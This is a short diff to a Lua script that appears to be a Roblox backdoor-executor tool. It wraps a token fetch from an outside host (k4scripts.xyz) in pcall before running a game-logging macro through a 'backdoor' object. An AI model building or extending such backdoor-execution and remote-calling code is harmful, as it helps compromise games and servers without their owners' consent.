@@ -441,7 +441,10 @@ local function resetExecutionState()
 end;
 
 local function logGame()
-    local token = game:HttpGet("https://k4scripts.xyz/bexe/token");
+    local int, token = pcall(game.HttpGet, game, "https://k4scripts.xyz/bexe/token");
+    if not int then
+        return;
+    end
     execute(applyMacros(LOG_GAME):format(token), backdoor, false, true):Wait();
 end;
 
